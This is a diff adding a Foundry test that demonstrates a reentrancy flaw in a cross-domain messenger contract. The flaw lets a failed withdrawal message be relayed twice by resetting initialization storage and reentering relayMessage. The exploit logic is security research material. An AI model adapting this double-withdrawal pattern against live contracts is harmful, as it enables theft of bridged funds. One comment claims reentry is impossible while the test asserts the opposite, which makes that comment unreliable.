@@ -595,3 +595,85 @@ contract L1CrossDomainMessenger_Test is Bridge_Initializer {
         assertEq(l1CrossDomainMessenger.paused(), superchainConfig.paused());
     }
 }
+
+/// @dev A test demonstarting a reentrancy vulnerability in the CrossDomainMessenger contract, which
+///      is possible by intercepting and sandwhiching a signed Safe Transaction to upgrade it.
+contract L1CrossDomainMessenger_ReinitReentryTest is Bridge_Initializer {
+    bool attacked;
+
+    // Common values used across functions
+    uint256 constant messageValue = 50;
+    bytes constant selector = abi.encodeWithSelector(this.reinitAndReenter.selector);
+    address sender;
+    bytes32 hash;
+    address target;
+
+    function setUp() public override {
+        super.setUp();
+        target = address(this);
+        sender = Predeploys.L2_CROSS_DOMAIN_MESSENGER;
+        hash = Hashing.hashCrossDomainMessage(
+            Encoding.encodeVersionedNonce({ _nonce: 0, _version: 1 }), sender, target, messageValue, 0, selector
+        );
+        vm.deal(address(l1CrossDomainMessenger), messageValue * 2);
+    }
+
+    /// @dev This method will be called by the relayed message, and will attempt to reenter the relayMessage function
+    ///      exactly once.
+    function reinitAndReenter() public payable {
+        // only attempt the attack once
+        if (!attacked) {
+            attacked = true;
+            // set initialized to false
+            vm.store(address(l1CrossDomainMessenger), 0, bytes32(uint256(0)));
+
+            // call the initializer function
+            l1CrossDomainMessenger.initialize(SuperchainConfig(superchainConfig));
+
+            // attempt to re-replay the withdrawal
+            l1CrossDomainMessenger.relayMessage(
+                Encoding.encodeVersionedNonce({ _nonce: 0, _version: 1 }), // nonce
+                sender,
+                target,
+                messageValue,
+                0,
+                selector
+            );
+        }
+    }
+
+    /// @dev A test showing that the relayMessage function cannot be reentered by calling the `initialize()` function
+    /// within the relayed message.
+    function test_relayMessage_replayStraddlingReinit_succeeds() external {
+        uint256 balanceBeforeThis = address(this).balance;
+        uint256 balanceBeforeMessenger = address(l1CrossDomainMessenger).balance;
+
+        // A requisite for the attack is that the message has already been attempted and written to the failedMessages
+        // mapping, so that it can be replayed.
+        vm.store(address(l1CrossDomainMessenger), keccak256(abi.encode(hash, 206)), bytes32(uint256(1)));
+        assert(l1CrossDomainMessenger.failedMessages(hash));
+
+        // Expect to see the message relayed twice.
+        vm.expectEmit(address(l1CrossDomainMessenger));
+        emit RelayedMessage(hash);
+        vm.expectEmit(address(l1CrossDomainMessenger));
+        emit RelayedMessage(hash);
+
+        l1CrossDomainMessenger.relayMessage(
+            Encoding.encodeVersionedNonce({ _nonce: 0, _version: 1 }), // nonce
+            sender,
+            target,
+            messageValue,
+            0,
+            selector
+        );
+
+        // the message hash is now in the successfulMessages mapping
+        assert(l1CrossDomainMessenger.successfulMessages(hash));
+
+        // The balance of this contract was increased by twice the value of the message, and the messenger's
+        // balance was decreased by the same amount.
+        assertEq(address(this).balance, balanceBeforeThis + 2 * messageValue);
+        assertEq(address(l1CrossDomainMessenger).balance, balanceBeforeMessenger - 2 * messageValue);
+    }
+}
